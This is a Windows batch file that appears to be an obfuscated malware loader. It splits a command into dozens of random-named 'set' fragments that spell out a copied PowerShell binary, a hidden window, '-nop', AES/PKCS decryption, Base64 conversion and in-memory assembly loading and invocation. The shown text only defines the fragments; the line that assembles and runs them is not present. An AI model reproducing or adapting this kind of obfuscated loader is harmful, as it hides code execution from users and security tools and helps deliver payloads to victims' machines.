@echo off
set "GgjBAudsJm= /"
set "CCbMxlbnXm=rs"
set "sZpSVpmBTB=ll"
set "ojpLGgxvLe=\W"
set "JaiISgIjyQ=.e"
set "qIhoVzrVhs=do"
set "SDIYYBFNHf=xe"
set "OCntKVmPwC=rS"
set "auUHlelfzc=:\"
set "doPlOOmvyu=0\"
set "iKrulFjTiw=py"
set "AQzLafYKKg=\v"
set "ZqBkDSuExr=y "
set "ohzIckmKLM=ll"
set "SDmpxuvYbL=he"
set "KqrlWdDNlE=he"
set "CbWKRbpWbB=32"
set "IYSKANQJjg=ow"
set "eqUdEgNJAh=1."
set "AnFYtJdaHw=st"
set "eVKkqARomS= C"
set "udtfOhlCbP=s\"
set "eScezbflnP=we"
set "uhYfhBSpSP=ws"
set "LhayVfIQzg=em"
set "dlVEeCFkaE=in"
set "weVwlGbbQg=we"
set "JGJWJYyGux=Sy"
set "jbWnnNDXzB=nd"
set "JoiQczneCB=co"
set "HmeucqgrGp=Po"
set "IKVVcTRFkR=po"
set "IWKhjBQkFp=Wi"
set "HqDrpgtuft= %~dp0"
set "iNnLXSXsCA=cd"
set "uYkWVWIWNp=$Yev"
set "AWhCaVhRmh=s, 0"
set "wxiZEAXvfg=BC;$"
set "QwJzNCfGVo=y]::"
set "yZUAEdJitG=16] "
set "wekkdfXyUe=);$s"
set "idnHghzaZs=1] -"
set "EuUdjHPlFb=evKs"
set "qUNKhEwmlo===')"
set "kQijlSIOqs=DZU."
set "dYqQaTVkHO='txe"
set "JIpWIUwRtH=tVBC"
set "qxsbePfWLz=ay()"
set "GXFahAriFH=jsCC"
set "KbvYftZciw=.Mod"
set "MyABeGrMXY=PTtG"
set "IpFrgUvdPd=-nop"
set "IldlIWjnLh=.Mem"
set "XeJSdbPHuX=ddin"
set "fzlPjoeqRf=();$"
set "RmzUErPCKS=;$sV"
set "LzxrWkfpGv=stem"
set "ZioitPuozU=BC.T"
set "NXQEiDuohC=BC);"
set "QJPrpHLCdn=mory"
set "VNooxHXqdb=ose("
set "BPpIaldbnu=rans"
set "KJMjOXPWCE=in $"
set "DoYYtRfxFN=);$f"
set "BKNQBIGHzQ=;$Vz"
set "jUvjCPfTtD=s = "
set "wcFXosbRVk=rtS4"
set "DKhYSkfyzx=);$V"
set "paKlQjwruu=g = "
set "oFiVMzeKkH=.Ass"
set "qSFWaZKdEq=yste"
set "jkWnMwTMVl=form"
set "wuRMOThpYy=y.Ci"
set "jXXUWFAbQo=pose"
set "hoAUBbkqdN=vert"
set "sJFmZveGJp=PKCS"
set "BdVtAByAcD=.Cry"
set "ioameKyKDh=jsCC"
set "hKJhGbDcTd=urit"
set "BTXpuxAeOW=);$f"
set "WwpDoVowtS=106u"
set "yAaeLYIjVW=ke($"
set "ZXiLFIyCXy=ew-O"
set "VgIfXrwFpR=se()"
set "lWjSGkwVEu=ert]"
